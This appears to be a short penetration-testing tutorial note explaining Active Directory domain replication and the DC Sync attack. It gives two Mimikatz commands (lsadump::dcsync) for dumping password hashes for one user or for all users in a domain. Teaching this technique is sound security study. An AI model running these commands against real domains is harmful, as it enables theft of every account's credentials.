**DC Sync**<br>

In large organisations, they do not use a single DC per domain, this action may delay any authentication services in AD. So they use multiple DCs.  The question then becomes, how is it possible for you to authenticate using the same credentials in two different offices?.....<br>
The answer to that question is **domain replication**. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user's new password and new objects such as when a new user is created. This is why you usually have to wait a couple of minutes before you authenticate after you have changed your password since the DC where the password change occurred could perhaps not be the same one as the one where you are authenticating to.

The process of replication is called **DC Synchronisation**. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. <br>
> To perform a DC Sync attack, the attacker needs to have access to an account that has domain replication permissions. This is typically a highly privileged account, such as a member of the Domain Admins or Enterprise Admins group, or any account with the "Replicating Directory Changes" permission.


**DCSync All**

We will be using Mimikatz to harvest credentials:
```
mimikatz # lsadump::dcsync /domain:<DomainName> /user:<Usernaem>@<DomainName>
```
If we want to retrieve information for all users in the domain. This will dump the password hashes for every user account in the domain:
```
mimikatz # lsadump::dcsync /domain:<DomainName> /all
```




















